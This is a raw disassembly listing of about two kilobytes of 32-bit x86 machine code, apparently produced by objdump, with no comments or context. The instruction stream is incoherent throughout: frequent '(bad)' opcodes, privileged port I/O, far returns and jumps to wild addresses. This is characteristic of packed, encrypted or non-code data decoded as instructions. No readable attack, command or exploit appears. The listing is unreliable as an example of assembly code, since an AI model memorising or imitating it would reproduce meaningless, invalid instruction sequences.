  432da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432da1:	rol    DWORD PTR [eax+esi*8],0x2f
  432da5:	sar    esp,0xda
  432da8:	das    
  432da9:	shl    DWORD PTR [ebp-0x2907046e],0xf2
  432db0:	shl    DWORD PTR [edi+0x4f],cl
  432db3:	retf   0xa900
  432db6:	and    ecx,DWORD PTR [ecx-0x2]
  432db9:	test   eax,0xf6be07f6
  432dbe:	add    bh,ch
  432dc0:	(bad)  
  432dc1:	or     al,0xb1
  432dc3:	mov    ch,0xdf
  432dc5:	dec    eax
  432dc6:	frstor [edx-0x4a]
  432dc9:	shr    BYTE PTR [edx],0xb8
  432dcc:	in     eax,0x58
  432dce:	sub    bh,BYTE PTR [eax+0xf2a58e9]
  432dd4:	dec    ecx
  432dd5:	jmp    DWORD PTR [eax+0x6a0c8d49]
  432ddb:	push   ds
  432ddc:	in     al,dx
  432ddd:	je     0x432dc9
  432ddf:	xor    bl,BYTE PTR [ecx]
  432de1:	mov    ebp,0xbda15d93
  432de6:	adc    DWORD PTR [ecx-0x5f],0xffffffbd
  432dea:	mov    ah,0x5a
  432dec:	cmc    
  432ded:	dec    esi
  432dee:	lahf   
  432def:	pop    edx
  432df0:	clc    
  432df1:	out    0x31,eax
  432df3:	mov    edi,0x2b99f901
  432df8:	fyl2xp1 
  432dfa:	je     0x432db5
  432dfc:	pop    esi
  432dfd:	inc    ebx
  432dfe:	in     eax,0xc6
  432e00:	jmp    0x432e66
  432e02:	mul    DWORD PTR [ecx]
  432e04:	fnstcw WORD PTR [ebp-0x53]
  432e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e08:	push   edx
  432e09:	inc    ebx
  432e0a:	int    0x31
  432e0c:	add    dh,BYTE PTR [ebx-0xf]
  432e0f:	xchg   BYTE PTR [edx-0x2e8b41fc],cl
  432e15:	adc    ch,BYTE PTR [ecx]
  432e17:	pop    esi
  432e18:	or     bl,al
  432e1a:	shl    BYTE PTR [ecx-0x5c4fa568],cl
  432e20:	fadd   QWORD PTR [eax]
  432e22:	xor    al,0x0
  432e24:	jmp    0x432e1a
  432e26:	dec    esi
  432e27:	aas    
  432e28:	jmp    0x432e21
  432e2a:	out    0x79,eax
  432e2c:	dec    esi
  432e2d:	add    ecx,edi
  432e2f:	add    BYTE PTR [ebx-0x5d],bh
  432e32:	add    bh,bh
  432e34:	push   esi
  432e35:	add    eax,DWORD PTR [edx+0xcf5cf45]
  432e3b:	fs adc eax,0x8783009b
  432e41:	push   es
  432e42:	xchg   BYTE PTR [ebp-0x71],al
  432e45:	stos   BYTE PTR es:[edi],al
  432e46:	div    DWORD PTR [ebp+0x43]
  432e49:	imul   BYTE PTR [ebp+0x4]
  432e4c:	lods   al,BYTE PTR ds:[esi]
  432e4d:	out    dx,eax
  432e4e:	inc    esp
  432e4f:	push   ss
  432e50:	retf   
  432e51:	(bad)  
  432e53:	fadd   DWORD PTR [eax]
  432e55:	sbb    eax,DWORD PTR [eax+0x5e]
  432e58:	inc    edx
  432e59:	sbb    BYTE PTR [eax+eax*1],al
  432e5c:	dec    esp
  432e5d:	mov    fs,WORD PTR [esp+eax*1]
  432e60:	cmp    al,0x8b
  432e62:	or     bh,bh
  432e64:	retf   0xf7de
  432e67:	adc    eax,0x40ecfb
  432e6c:	je     0x432e80
  432e6e:	adc    eax,eax
  432e70:	or     ebx,DWORD PTR [ecx]
  432e72:	add    al,0x0
  432e74:	cmp    BYTE PTR [esi],ah
  432e76:	sub    al,0x56
  432e78:	in     al,0x81
  432e7a:	jmp    0xf73a7367
  432e7f:	inc    DWORD PTR [edi+0x1d]
  432e82:	je     0x432ec0
  432e84:	adc    esi,ecx
  432e86:	or     esi,0x0
  432e89:	mov    ds:0xacfff51f,eax
  432e8e:	pop    ecx
  432e8f:	shl    BYTE PTR [esp+ebp*2-0x7a],0x4c
  432e94:	and    al,0x63
  432e96:	add    dh,BYTE PTR [eax-0x60907ef]
  432e9c:	je     0x432e24
  432e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432e9f:	adc    BYTE PTR [eax-0x30],bl
  432ea2:	push   es
  432ea3:	sub    al,0xc0
  432ea5:	push   ecx
  432ea6:	rcl    DWORD PTR [edi-0x7d],1
  432ea9:	bound  ebp,QWORD PTR [edx+0xd]
  432eac:	or     DWORD PTR [esi+0x554f543f],esp
  432eb2:	push   es
  432eb3:	stc    
  432eb4:	clc    
  432eb5:	ja     0x432e67
  432eb7:	push   cs
  432eb8:	inc    eax
  432eb9:	bound  esi,QWORD PTR [ebp-0x3c]
  432ebc:	jae    0x432f24
  432ebe:	rol    BYTE PTR [ebx],0xe5
  432ec1:	rol    DWORD PTR [ebp-0x1a],0x13
  432ec5:	push   ds
  432ec6:	or     eax,0xecd9003d
  432ecb:	loopne 0x432ee0
  432ecd:	mov    ds:0xe3e879f0,al
  432ed2:	pushf  
  432ed3:	xor    DWORD PTR [ecx],esp
  432ed5:	(bad)  
  432ed6:	lock push 0xdcbdd906
  432edc:	mov    esi,0x53e5b6ff
  432ee1:	cmc    
  432ee2:	(bad)  
  432ee3:	in     eax,0x13
  432ee5:	push   ds
  432ee6:	or     eax,0x2d87003d
  432eeb:	xor    ah,BYTE PTR [ecx]
  432eed:	add    BYTE PTR [edx-0x10],ah
  432ef0:	outs   dx,DWORD PTR ds:[esi]
  432ef1:	cs leave 
  432ef3:	imul   dh
  432ef5:	inc    esp
  432ef6:	xchg   BYTE PTR [eax],cl
  432ef8:	or     eax,0x690f6673
  432efd:	and    al,0x22
  432eff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432f00:	inc    eax
  432f01:	and    al,0x66
  432f03:	jmp    FWORD PTR [eax+0x24]
  432f06:	and    cl,BYTE PTR [ebx+0x3850b7]
  432f0c:	aad    0x17
  432f0e:	data16 lock cld 
  432f11:	and    BYTE PTR [edx+0x5fe5c5c3],0x73
  432f18:	popa   
  432f19:	and    al,0x66
  432f1b:	lock push 0x20cb7d9f
  432f21:	sbb    al,0x75
  432f23:	fdivr  DWORD PTR [edx+0x39a5a235]
  432f29:	xchg   DWORD PTR [esi+0x5df7a5b4],ebx
  432f2f:	scas   eax,DWORD PTR es:[edi]
  432f30:	xor    bl,BYTE PTR [esi+0x57]
  432f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432f34:	outs   dx,BYTE PTR ds:[esi]
  432f35:	in     al,dx
  432f36:	(bad)  
  432f37:	shl    DWORD PTR [edi+0x6a],1
  432f3a:	pop    ecx
  432f3b:	fimul  DWORD PTR [edi]
  432f3d:	sti    
  432f3e:	mov    eax,ds:0x36c17f09
  432f43:	add    eax,0x8e227f62
  432f48:	mov    ch,0x51
  432f4a:	fist   WORD PTR [edi+edi*1]
  432f4d:	add    eax,0x7f4a0519
  432f52:	add    BYTE PTR [edx],ah
  432f54:	mov    gs,WORD PTR [ecx-0x14424982]
  432f5a:	cli    
  432f5b:	ror    bh,cl
  432f5d:	data16 in al,dx
  432f5f:	cld    
  432f60:	(bad)  
  432f61:	in     al,0x5d
  432f63:	push   edx
  432f64:	mov    eax,ds:0x193efe0e
  432f69:	lea    eax,[edi]
  432f6b:	mov    BYTE PTR [eax+0x10],bl
  432f6e:	adc    ch,BYTE PTR [ebx-0x63]
  432f71:	and    DWORD PTR [ebx+0x24],edx
  432f74:	add    al,0x7a
  432f76:	dec    edx
  432f78:	out    dx,al
  432f79:	pop    ds
  432f7a:	adc    BYTE PTR [edx],ah
  432f7c:	fldcw  WORD PTR [ebx+eax*8+0x31]
  432f80:	loopne 0x432fe9
  432f82:	push   0x69
  432f84:	ficomp DWORD PTR [ebx+edx*1-0x55]
  432f88:	lea    eax,[ebx]
  432f8a:	adc    al,0xab
  432f8c:	mov    ebx,gs
  432f8e:	call   0x44372104
  432f93:	bound  ebx,QWORD PTR [esi-0x59]
  432f96:	outs   dx,DWORD PTR ds:[esi]
  432f97:	dec    cx
  432f99:	call   0x479a7a
  432f9e:	fdiv   QWORD PTR [ebp-0x916bf18]
  432fa4:	adc    DWORD PTR [ebp-0x3f47167],eax
  432faa:	sahf   
  432fab:	jnp    0x432f54
  432fad:	stc    
  432fae:	cld    
  432faf:	cmp    eax,0x8fe940e8
  432fb4:	sbb    DWORD PTR [ecx+0x27],ebx
  432fb7:	add    BYTE PTR [ecx+edx*8],ah
  432fba:	add    BYTE PTR [edi+eax*8],dl
  432fbd:	cmc    
  432fbe:	jle    0x432f45
  432fc0:	loop   0x432f9a
  432fc2:	add    cl,ch
  432fc4:	xchg   ebx,eax
  432fc5:	jnp    0x433041
  432fc7:	je     0x433036
  432fc9:	and    DWORD PTR [esi-0x17],0xffffff91
  432fcd:	pop    esi
  432fce:	out    dx,eax
  432fcf:	inc    ecx
  432fd0:	inc    ebp
  432fd1:	(bad)  
  432fd2:	(bad)  
  432fd3:	call   0x6a4fbf6f
  432fd8:	and    dl,ch
  432fda:	call   0xf9452d0a
  432fdf:	ss (bad) 
  432fe1:	aad    0x62
  432fe3:	pusha  
  432fe4:	xor    eax,0x2d726259
  432fe9:	shl    DWORD PTR [edx+0x28],1
  432fec:	push   ds
  432fed:	shl    DWORD PTR [edx+0x60],1
  432ff0:	popf   
  432ff1:	or     DWORD PTR [ebx-0x7a571e5c],0x37
  432ff8:	scas   al,BYTE PTR es:[edi]
  432ff9:	(bad)  
  432ffa:	stc    
  432ffb:	(bad)  
  432ffc:	mov    edx,0xbe2bc79e
  433001:	add    eax,DWORD PTR [eax+0xd935fd]
  433007:	jmp    0x3695d822
  43300c:	add    al,0x7f
  43300e:	sub    eax,0x249d14d6
  433013:	div    DWORD PTR [edx]
  433015:	test   eax,0x1fc20085
  43301a:	hlt    
  43301b:	std    
  43301c:	add    BYTE PTR [ebx-0x29],bh
  43301f:	or     BYTE PTR [ebx-0x79],0x5c
  433023:	les    ecx,FWORD PTR [ebx+eiz*4]
  433026:	outs   dx,BYTE PTR ds:[esi]
  433027:	cmc    
  433028:	inc    esp
  43302a:	cmp    dh,BYTE PTR [eax]
  43302c:	jne    0x4330a9
  43302e:	xlat   BYTE PTR ds:[ebx]
  43302f:	adc    ebp,0xffffffb2
  433032:	out    0x1f,al
  433034:	add    BYTE PTR [ebx+0x79],cl
  433037:	add    DWORD PTR [edi+ebx*1-0x19],0xf0fb21e8
  43303f:	test   BYTE PTR [ebx-0x317c8745],0x5d
  433046:	push   ss
  433047:	mov    ecx,0x85d31108
  43304c:	inc    esp
  43304d:	pop    edi
  43304e:	jmp    0xe30ab9b1
  433053:	push   cs
  433054:	push   eax
  433055:	add    BYTE PTR [ebp-0x18],0xd8
  433059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43305a:	icebp  
  43305b:	test   BYTE PTR [ebx+edi*1+0x1eff1f73],0x4b
  433063:	or     eax,0x40bc0b40
  433068:	daa    
  433069:	sti    
  43306a:	(bad)  
  43306b:	ins    DWORD PTR es:[edi],dx
  43306c:	push   ss
  43306d:	mov    ebp,0xdbb8edb5
  433072:	mov    ecx,0x99b40000
  433077:	lock inc edi
  433079:	and    esi,DWORD PTR [esi+0x78bb0046]
  43307f:	xor    edi,eax
  433081:	add    BYTE PTR [ecx],bh
  433083:	xor    DWORD PTR [edx],ebp
  433085:	shl    BYTE PTR [eax-0x24],0xb0
  433089:	add    DWORD PTR [ebx+ebx*4],esp
  43308c:	push   ebp
  43308d:	pop    ebx
  43308e:	cmp    bl,BYTE PTR [ecx]
  433090:	test   BYTE PTR [eax],al
  433092:	(bad)  
  433093:	lock cld 
  433095:	mov    ebp,0x854ff072
  43309a:	jle    0x43307d
  43309c:	dec    ebp
  43309d:	push   edx
  43309e:	sub    eax,0x7dfb1928
  4330a3:	dec    ebx
  4330a4:	sub    eax,0xfced3bce
  4330a9:	xchg   BYTE PTR [edi],ah
  4330ab:	cmp    al,0x77
  4330ad:	inc    ebx
  4330ae:	data16 repz cmp BYTE PTR [esi+0x86f6bb2],bh
  4330b6:	push   ebp
  4330b7:	loope  0x4330b9
  4330b9:	stc    
  4330ba:	ja     0x4330cc
  4330bc:	or     eax,DWORD PTR [eax+0x62]
  4330bf:	xchg   esp,ebp
  4330c1:	jge    0x433100
  4330c3:	mov    esi,DWORD PTR [eax+0x67]
  4330c6:	jno    0x433052
  4330c8:	dec    edx
  4330c9:	push   edx
  4330ca:	xchg   ebp,eax
  4330cb:	jnp    0x4330dc
  4330cd:	add    al,0x4c
  4330cf:	xor    ch,bh
  4330d1:	gs jbe 0x433116
  4330d4:	loop   0x433109
  4330d6:	stos   BYTE PTR es:[edi],al
  4330d7:	adc    edi,DWORD PTR [ecx]
  4330d9:	add    BYTE PTR ds:0xa210e125,cl
  4330df:	lock jg 0x4330a2
  4330e2:	jbe    0x4330da
  4330e4:	dec    ecx
  4330e5:	test   DWORD PTR [eax],eax
  4330e7:	sub    bl,BYTE PTR [eax-0x451209ea]
  4330ed:	jne    0x4330df
  4330ef:	fucomip st,st(1)
  4330f1:	jo     0x433110
  4330f3:	dec    eax
  4330f4:	pcmpeqd mm1,mm2
  4330f7:	retf   0xe632
  4330fa:	stc    
  4330fb:	int    0x73
  4330fd:	les    esi,FWORD PTR [esi+ebx*2-0x79]
  433101:	mov    edx,0x100b8ce5
  433106:	int3   
  433107:	dec    edi
  433108:	xor    ch,bh
  43310a:	test   BYTE PTR [ecx+ebx*8+0x4d],dl
  43310e:	add    eax,0xcb6e12df
  433113:	fwait
  433114:	out    0xbe,al
  433116:	adc    bh,ah
  433118:	shr    BYTE PTR [esi],1
  43311a:	pop    edx
  43311b:	mov    WORD PTR [edx-0x144def3e],gs
  433121:	daa    
  433122:	add    al,0x13
  433124:	add    bl,ah
  433126:	das    
  433127:	push   eax
  433128:	cdq    
  433129:	out    0x52,eax
  43312b:	imul   ebp,ebx,0xffffff8b
  43312e:	adc    BYTE PTR [edx],ah
  433130:	(bad)  
  433132:	ret    
  433133:	mov    ebx,0x14bd2e9f
  433138:	(bad)  
  433139:	out    0x59,eax
  43313b:	bound  eax,QWORD PTR [eax]
  43313d:	sti    
  43313e:	pop    ds
  43313f:	push   esi
  433140:	add    bl,dh
  433142:	pop    ds
  433143:	outs   dx,BYTE PTR ds:[esi]
  433144:	add    al,bh
  433146:	(bad)  
  433147:	cmp    ah,bh
  433149:	mov    ebx,0xd9a2000d
  43314e:	and    eax,0x6ea625fb
  433153:	xlat   BYTE PTR ds:[ebx]
  433154:	lahf   
  433155:	in     eax,dx
  433156:	add    dl,BYTE PTR [ebx-0x50]
  433159:	push   esp
  43315a:	aam    0xf7
  43315c:	mov    dl,0x54
  43315e:	(bad)  
  43315f:	sti    
  433160:	fisub  WORD PTR [edx]
  433162:	dec    esi
  433163:	push   ecx
  433164:	out    0xdc,eax
  433166:	cdq    
  433167:	dec    esi
  433168:	fist   WORD PTR [edx+ebp*1]
  43316b:	push   ebx
  43316c:	push   si
  43316e:	daa    
  43316f:	gs pusha 
  433171:	fcomp  QWORD PTR [edi]
  433173:	sbb    dl,dl
  433175:	hlt    
  433176:	shr    DWORD PTR [edi+0x2e],1
  433179:	add    ah,dh
  43317b:	mov    bh,0x71
  43317d:	cdq    
  43317e:	out    0x28,eax
  433180:	ja     0x43313a
  433182:	out    0x3,eax
  433184:	xor    DWORD PTR [ebx-0x1aba0a00],ebp
  43318a:	mov    esp,DWORD PTR [ebp+ebx*4+0x5e5c3071]
  433191:	fst    DWORD PTR [eax+0x53]
  433194:	inc    ecx
  433195:	push   esi
  433196:	vpsubsb xmm0,xmm7,XMMWORD PTR [eax]
  43319a:	stc    
  43319b:	jmp    0xb64aac
  4331a0:	je     0x43313e
  4331a2:	aam    0x9
  4331a4:	repnz (bad) [edi]
  4331a7:	sub    al,0x9a
  4331a9:	mov    WORD PTR [edi],ss
  4331ab:	mov    bh,0x2d
  4331ad:	and    eax,0x64001cff
  4331b2:	jge    0x43322f
  4331b4:	shl    DWORD PTR [esi-0x74],0xe
  4331b8:	ins    BYTE PTR es:[edi],dx
  4331b9:	inc    esp
  4331ba:	and    BYTE PTR [esi+0x5aa26159],0x22
  4331c1:	or     DWORD PTR [edi],edi
  4331c3:	adc    cl,ch
  4331c5:	inc    esi
  4331c6:	mov    esp,gs
  4331c8:	cmp    BYTE PTR [eax],0x1
  4331cb:	jae    0x43315e
  4331cd:	or     ebx,esp
  4331cf:	push   0xd946dc
  4331d4:	pop    esi
  4331d5:	ins    DWORD PTR es:[edi],dx
  4331d6:	cmc    
  4331d7:	adc    ch,BYTE PTR [ecx+0x42c0af61]
  4331dd:	push   es
  4331de:	lods   al,BYTE PTR ds:[esi]
  4331df:	test   DWORD PTR [ebp-0x4f],edx
  4331e2:	icebp  
  4331e3:	out    0x42,al
  4331e5:	pop    es
  4331e6:	add    ch,BYTE PTR ds:0x8ac491b
  4331ec:	pusha  
  4331ed:	sub    eax,0xfdac8afd
  4331f2:	rol    DWORD PTR [ebx+ebp*1+0x36],1
  4331f6:	add    dh,BYTE PTR [ebx-0x1f]
  4331f9:	xor    eax,DWORD PTR [edx]
  4331fb:	jae    0x4331f6
  4331fd:	(bad)  
  4331fe:	mov    ecx,DWORD PTR [eax+eax*1]
  433201:	pop    esp
  433202:	mov    WORD PTR [edi+edi*8],es
  433205:	xchg   esi,eax
  433206:	test   DWORD PTR [eax+eax*2],0xcba42cb
  43320d:	mov    ebx,0x7ff00a1
  433212:	mov    ecx,0x3700ff0c
  433217:	mov    ecx,0xd93aff0c
  43321c:	not    DWORD PTR ds:0x40cf73
  433222:	mov    ecx,0xaf82f903
  433227:	out    0x4b,eax
  433229:	push   ebp
  43322a:	push   ebp
  43322b:	xor    BYTE PTR [esp+0x3b],0x8e
  433230:	cmp    DWORD PTR [edi+edx*4-0x65],0xffffff83
  433235:	fld    st(6)
  433237:	in     al,dx
  433238:	jne    0x433293
  43323a:	scas   al,BYTE PTR es:[edi]
  43323b:	fimul  DWORD PTR [eax]
  43323d:	add    BYTE PTR [ebx],bh
  43323f:	or     BYTE PTR [ebx],0x8b
  433242:	cmc    
  433243:	mov    cl,0xed
  433245:	jl     0xc09a8289
  43324b:	inc    ecx
  43324c:	not    DWORD PTR [edx+0xf]
  43324f:	add    al,0x7e
  433252:	xor    eax,0xbb2bf8da
  433257:	and    DWORD PTR [esi],ebp
  433259:	je     0x433218
  43325b:	cmc    
  43325c:	or     al,0xcc
  43325e:	push   ss
  43325f:	fwait
  433260:	add    BYTE PTR ds:0xde08,bh
  433266:	mov    dh,0x9b
  433268:	div    DWORD PTR [edi+eiz*2-0x3f]
  43326c:	test   DWORD PTR [edi+eiz*2-0x17],eax
  433270:	div    DWORD PTR [edi+edx*1-0x39]
  433274:	or     ebx,0x1b
  433277:	mov    eax,ds:0x6200e7fa
  43327c:	stos   DWORD PTR es:[edi],eax
  43327d:	std    
  43327e:	jmp    DWORD PTR [edx+0x75]
  433281:	mov    ebp,0x39fe7d73
  433286:	and    al,0x52
  433288:	repnz push 0x192c7b02
  43328e:	sbb    BYTE PTR [edi],dh
  433290:	and    BYTE PTR [edx-0xe],bh
  433293:	and    eax,0x3cff9464
  433298:	mov    esi,0x2ce1553f
  43329d:	xor    BYTE PTR [esi+0x74ddf072],bh
  4332a3:	ds clc 
  4332a5:	fst    QWORD PTR [ebx]
  4332a7:	xchg   BYTE PTR ds:0x3030003d,ah
  4332ad:	jmp    0xda13ad9a
  4332b2:	stc    
  4332b3:	gs rcr ch,0x74
  4332b7:	xchg   BYTE PTR [eax],cl
  4332b9:	imul   eax,DWORD PTR [eax],0x55
  4332bc:	fsubr  QWORD PTR [eax]
  4332be:	sbb    BYTE PTR [ebp-0x1c],cl
  4332c1:	sub    BYTE PTR [eax],bl
  4332c3:	inc    ebp
  4332c4:	add    DWORD PTR [ecx],eax
  4332c6:	stc    
  4332c7:	push   edi
  4332c8:	and    bh,dh
  4332ca:	aas    
  4332cb:	bound  eax,QWORD PTR [ebx-0x34]
  4332ce:	jge    0x4332fa
  4332d0:	outs   dx,DWORD PTR ds:[esi]
  4332d1:	or     eax,0x10b22293
  4332d6:	add    BYTE PTR [edi+0x67df08b],dh
  4332dc:	aam    0x36
  4332de:	test   DWORD PTR [eax],eax
  4332e0:	adc    ebx,DWORD PTR [ebx-0x3b9006ef]
  4332e6:	idiv   DWORD PTR [edi]
  4332e8:	(bad)  
  4332e9:	std    
  4332ea:	adc    DWORD PTR [ecx],esp
  4332ec:	(bad)  
  4332ed:	lock push edi
  4332ef:	dec    eax
  4332f0:	in     eax,dx
  4332f1:	inc    esp
  4332f2:	cmc    
  4332f3:	mov    bl,BYTE PTR [edi-0x4d93c427]
  4332f9:	aad    0xe7
  4332fb:	add    esi,DWORD PTR [edx]
  4332fd:	jae    0x4332e4
  4332ff:	mov    ds,WORD PTR [eax+0x6203d1f0]
  433305:	fldcw  WORD PTR [esp+eax*8+0x31]
  433309:	scas   al,BYTE PTR es:[edi]
  43330a:	icebp  
  43330b:	dec    eax
  43330c:	mov    ds,edx
  43330e:	jnp    0x433318
  433310:	jne    0x4332a6
  433312:	or     ebx,DWORD PTR [ecx+0x4f]
  433315:	push   edx
  433316:	mov    cl,0xe2
  433318:	adc    ecx,ebp
  43331a:	outs   dx,BYTE PTR ds:[esi]
  43331b:	or     DWORD PTR [ebx+0x11e2e383],ebx
  433321:	ror    edx,1
  433323:	xor    esi,DWORD PTR [edx+0x55]
  433326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433327:	push   edi
  433328:	mov    bh,0x48
  43332a:	call   0xdb5dd070
  43332f:	add    ebp,DWORD PTR [ebx-0x7d]
  433332:	mov    esp,edx
  433334:	push   ecx
  433335:	cmc    
  433336:	sti    
  433337:	inc    ebx
  433338:	(bad)  
  433339:	(bad)  
  43333a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43333b:	out    dx,al
  43333c:	dec    eax
  43333d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43333e:	pop    esi
  43333f:	out    dx,eax
  433340:	popf   
  433341:	stos   BYTE PTR es:[edi],al
  433342:	cmp    al,BYTE PTR ss:[eax]
  433345:	mov    bl,0xfc
  433347:	sti    
  433348:	or     esp,edi
  43334a:	and    dh,BYTE PTR [esi-0x2076c41e]
  433350:	loop   0x433311
  433352:	aad    0x6a
  433354:	clc    
  433355:	popa   
  433356:	jecxz  0x4332ff
  433358:	add    esp,ecx
  43335a:	sbb    ebx,edx
  43335c:	or     edx,DWORD PTR [edi-0x1b13adf5]
  433362:	(bad)  
  433364:	add    ebx,edi
  433366:	cwde   
  433367:	out    dx,eax
  433368:	mov    WORD PTR [ecx+0x4e486e01],fs
  43336e:	dec    edx
  43336f:	add    al,ch
  433371:	ficomp DWORD PTR [ecx]
  433373:	je     0x433359
  433375:	(bad)  
  433376:	cwde   
  433377:	cld    
  433378:	daa    
  433379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43337a:	shl    BYTE PTR [edx+0x898e628],cl
  433380:	push   ss
  433381:	sub    ch,cl
  433383:	mov    ebx,DWORD PTR [ecx+ebp*4-0x3f66b056]
  43338a:	call   0xd9650d8f
  43338f:	test   ecx,edi
  433391:	in     eax,0x7
  433393:	jae    0x433363
  433395:	ror    BYTE PTR [eax-0xe508df4],0xd2
  43339c:	jecxz  0x433321
  43339e:	add    al,BYTE PTR [ecx+ebp*4+0x2485cd2a]
  4333a5:	jb     0x43336b
  4333a7:	cmp    BYTE PTR [eax+eax*1],bh
  4333aa:	dec    edx
  4333ab:	push   esi
  4333ac:	inc    ebx
  4333ad:	icebp  
  4333ae:	xchg   BYTE PTR [edi*2+0x15f683a7],cl
  4333b5:	push   0xffffff80
  4333b7:	cld    
  4333b8:	jae    0x4333a8
  4333ba:	add    bl,BYTE PTR [esi]
  4333bc:	std    
  4333bd:	call   0x514d2a23
  4333c2:	mov    dl,0xba
  4333c4:	add    cl,ch
  4333c6:	loopne 0x4333c6
  4333c8:	std    
  4333c9:	out    0x61,eax
  4333cb:	(bad)  [ecx]
  4333cd:	and    eax,0xd96d0216
  4333d2:	inc    edx
  4333d3:	outs   dx,BYTE PTR ds:[esi]
  4333d4:	or     BYTE PTR [esi-0x71],ch
  4333d7:	aad    0xf9
  4333d9:	cld    
  4333da:	gs out 0x40,eax
  4333dd:	jmp    0x56a94cbe
  4333e2:	dec    esi
  4333e3:	rol    BYTE PTR [ebx+0x59],cl
  4333e6:	fld    QWORD PTR [ecx]
  4333e8:	je     0x4333ea
  4333ea:	or     al,0xc1
  4333ec:	not    DWORD PTR ds:0x39049f
  4333f2:	aam    0x4c
  4333f4:	mov    esi,0xba0ed05e
  4333f9:	adc    bl,cl
  4333fb:	ret    0xec83
  4333fe:	dec    eax
  4333ff:	or     DWORD PTR [eax],edx
  433401:	xor    ecx,DWORD PTR [ecx-0x172b53d]
  433407:	sbb    edx,DWORD PTR [eax+0x52]
  43340a:	fldcw  WORD PTR [ebp+0xc]
  43340d:	lea    eax,[eax]
  43340f:	(bad)  
  433410:	daa    
  433411:	push   eax
  433412:	push   0x9800d7bf
  433417:	retf   0x3d10
  43341a:	lock mov dl,bh
  43341d:	add    BYTE PTR [eax],al
  43341f:	mov    esp,0x5c10f492
  433424:	aad    0x0
  433426:	(bad)  
  433427:	ds sbb eax,0xd78b1388
  43342d:	not    DWORD PTR ds:0x3902af
  433433:	lods   al,BYTE PTR ds:[esi]
  433434:	aas    
  433435:	adc    eax,eax
  433437:	cmp    edx,DWORD PTR [eax]
  433439:	mov    edx,0x83c44b08
  43343e:	in     al,dx
  43343f:	call   0x3d4c:0x933046b
  433446:	cld    
  433447:	mov    edx,DWORD PTR [ebx-0x37b295b6]
  43344d:	adc    DWORD PTR [ebp-0x49],0xd0c0cf9
  433454:	xchg   edi,eax
  433455:	add    bh,dh
  433457:	sar    ebp,cl
  433459:	mov    eax,0xee155240
  43345e:	add    eax,0x44a253
  433463:	(bad)  
  433465:	xor    edx,DWORD PTR [ebx-0x54]
  433468:	inc    ebx
  433469:	mov    edx,edi
  43346b:	ja     0x433467
  43346d:	sahf   
  43346e:	jl     0x4334de
  433470:	xor    al,0xfd
  433472:	push   ecx
  433473:	add    ch,ch
  433475:	sbb    eax,0xf0a20e49
  43347a:	(bad)  
  43347b:	add    ebp,DWORD PTR [edx+0x6300415c]
  433481:	gs sti 
  433483:	out    0xbc,eax
  433485:	fucom  st(0)
  433487:	stc    
  433488:	fidiv  WORD PTR [eax+0x5e20f51]
  43348e:	lds    esi,FWORD PTR [esi+ebx*1-0x10]
  433492:	std    
  433493:	shl    BYTE PTR [edi-0x4c],0x51
  433497:	inc    esp
  433498:	bound  esp,QWORD PTR ds:0xba623ced
  43349e:	fst    DWORD PTR [ebx]
  4334a0:	and    bh,dh
  4334a2:	cmp    al,0x0
  4334a4:	fdiv   DWORD PTR [edi]
  4334a6:	in     al,dx
  4334a7:	or     al,0x8b
  4334a9:	or     ebx,ecx
  4334ab:	test   DWORD PTR [edi],esi
  4334ad:	xor    al,0xf7
  4334af:	aas    
  4334b0:	bound  esp,QWORD PTR [esi-0x5076d2fe]
  4334b6:	test   eax,edi
  4334b8:	adc    ebx,esp
  4334ba:	(bad)  
  4334bc:	jmp    0xc8529b28
  4334c1:	out    dx,al
  4334c2:	xor    ecx,edi
  4334c4:	xor    al,0x77
  4334c6:	fdivr  QWORD PTR [ebp+0x47]
  4334c9:	dec    ebx
  4334ca:	pop    eax
  4334cb:	add    esp,ecx
  4334cd:	push   edx
  4334ce:	fnstenv [ebx+0x60]
  4334d1:	ds mov dh,0x85
  4334d4:	ja     0x433512
  4334d6:	repz aas 
  4334d8:	add    BYTE PTR [edx-0x1b],ah
  4334db:	(bad)  
  4334dd:	mov    ch,0xd9
  4334df:	bound  esi,QWORD PTR [esi+0x3dba15dc]
  4334e5:	test   eax,0xd30f269e
  4334ea:	xlat   BYTE PTR ds:[ebx]
  4334eb:	data16 fdiv st(4),st
  4334ee:	test   ch,ch
  4334f0:	adc    ah,BYTE PTR [edx]
  4334f2:	pop    ecx
  4334f3:	rol    BYTE PTR [edi],0x6b
  4334f6:	retf   0xc45b
  4334f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4334fa:	push   ebp
  4334fb:	das    
  4334fc:	not    DWORD PTR [eax-0x21]
  4334ff:	(bad)  
  433500:	repz call 0x3a77249d
  433506:	pop    ecx
  433507:	dec    esp
  433508:	inc    esp
  433509:	(bad)  
  43350a:	cli    
  43350b:	repz arpl WORD PTR [eax-0x67],dx
  43350f:	out    0x82,eax
  433511:	sahf   
  433512:	int3   
  433513:	repnz mov ebx,0xc2a71957
  433519:	je     0x433534
  43351b:	or     DWORD PTR es:[esi-0x55f72618],0xffffff84
  433523:	and    eax,DWORD PTR [ecx*4+0x33363ca6]
  43352a:	dec    edi
  43352b:	mov    al,0x58
  43352d:	xor    BYTE PTR [ebx],bh
  43352f:	inc    ebx
  433530:	pop    eax
  433531:	push   ds
  433532:	fst    DWORD PTR [ecx]
  433534:	fist   WORD PTR [ecx-0x73]
  433537:	aad    0x43
  433539:	bound  eax,QWORD PTR [ebx]
  43353b:	in     al,0xcb
  43353d:	add    dh,dl
  43353f:	popf   
  433540:	out    0x4,eax
  433542:	rcl    ebx,1
  433544:	(bad)  
  433545:	adc    edx,DWORD PTR [ecx-0x7]
  433548:	xchg   ecx,eax
  433549:	xchg   DWORD PTR [edx],esp
  43354b:	outs   dx,BYTE PTR ds:[esi]
  43354c:	clc    
  43354d:	sub    DWORD PTR [ecx+0x21],0xfffffffb
  433551:	inc    edi
  433552:	(bad)  
  433553:	fisub  DWORD PTR [edx+0x6e1e08]
  433559:	sub    eax,0x2a10cc5e
  43355e:	mov    di,cx
  433561:	cld    
